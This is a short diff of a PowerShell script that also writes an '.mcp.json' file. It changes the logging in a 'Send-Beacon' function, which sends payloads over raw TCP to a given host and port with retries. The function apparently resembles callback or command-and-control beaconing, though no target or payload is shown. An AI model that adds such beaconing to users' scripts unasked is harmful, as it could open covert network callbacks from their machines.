@@ -99,7 +99,7 @@ Write-Verbose "  Wrote .mcp.json"
 function Send-Beacon {
     param([string]$Payload, [string]$TargetHost, [int]$TargetPort, [int]$Retries = 5)
     $payloadType = ($Payload -split ' ')[0]
-    Write-Verbose "Beacon [$payloadType] -> ${TargetHost}:${TargetPort}"
+    Write-Host "Beacon [$payloadType] -> ${TargetHost}:${TargetPort}"
     for ($i = 0; $i -lt $Retries; $i++) {
         try {
             $tcp = [System.Net.Sockets.TcpClient]::new()
@@ -110,15 +110,15 @@ function Send-Beacon {
             $stream.Write($bytes, 0, $bytes.Length)
             $stream.Flush()
             $tcp.Close()
-            Write-Verbose "Beacon [$payloadType] delivered successfully"
+            Write-Host "Beacon [$payloadType] delivered successfully" -ForegroundColor Green
             return $true
         } catch {
             $wait = [Math]::Min([Math]::Pow(2, $i), 30)
-            Write-Verbose "Beacon attempt $($i+1) failed: $_ (retry in ${wait}s)"
+            Write-Host "Beacon attempt $($i+1) failed: $_ (retry in ${wait}s)" -ForegroundColor Yellow
             Start-Sleep -Seconds $wait
         }
     }
-    Write-Verbose "Beacon [$payloadType] failed after $Retries attempts"
+    Write-Host "Beacon [$payloadType] failed after $Retries attempts" -ForegroundColor Red
     return $false
 }
 
